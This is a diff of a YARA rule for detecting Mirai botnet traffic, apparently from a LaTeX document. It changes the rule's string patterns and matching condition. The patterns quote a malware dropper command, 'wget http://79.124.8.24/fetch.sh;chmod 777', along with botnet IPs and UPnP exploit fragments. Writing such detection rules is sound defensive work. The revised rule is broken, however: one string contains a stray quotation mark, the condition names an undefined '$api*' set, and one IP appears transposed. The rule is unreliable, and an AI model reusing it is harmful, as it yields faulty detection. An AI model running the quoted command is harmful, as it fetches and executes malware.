@@ -892,27 +892,32 @@ rule Mirai_Rule
         malware_type = "Botnet"
 
     strings:
-        $http_get = "GET"
-        $http_post = "POST"
-        $cookie = "Cookie: PHPSESSID"
+        $http_post1 = "POST /index.jsp HTTP/1.1" nocase
+        $http_post2 = "POST /kylin/api/cubes/kaylin_streaming_cube/" HTTP/1.1" nocase
 
-        $soap = "SOAPAction:"
-        $soap2 = "urn:schemas-upnp"
-        $purenet = "http://purenetworks.com"
+        $soap1 = "SOAPAction: urn:schemas-upnp-" nocase
+        $soap2 = "urn:schemas-upnp" nocase
+        $soap3 = "http://purenetworks.com" nocase
 
         $ip1 = "79.124.8.24"
-        $ip2 = "79.124.18.20"
+        $ip2 = "79.142.18.20"
 
-        $xml1 = "</NewRemoteHost>"
-        $xml2 = "eHost>"
-        $xml3 = "<NewProtocol>TCP"
+        $xml1 = "</NewRemoteHost>" nocase
+        $xml2 = "eHost>" nocase
+        $xml3 = "<NewProtocol>TCP" nocase
 
-        $procnet = "/proc/net/tcp"
-        $wget = "wget http://79.124.8.24/fetch.sh;chmod 777"
-        $domain = "iotsecurity.xyz"
+        $other1 = "/proc/net/tcp" nocase
+        $other2 = "wget http://79.124.8.24/fetch.sh;chmod 777" nocase
+        $other3 = "iotsecurity.xyz" nocase
 
     condition:
-        all of them
+       1 of ($http_post*) 
+       and 
+       2 of ($soap*)
+       and
+       2 of ($api*)
+       and
+       (any of ($xml*) or any of ($other*)) 
 }
 
 \end{lstlisting}
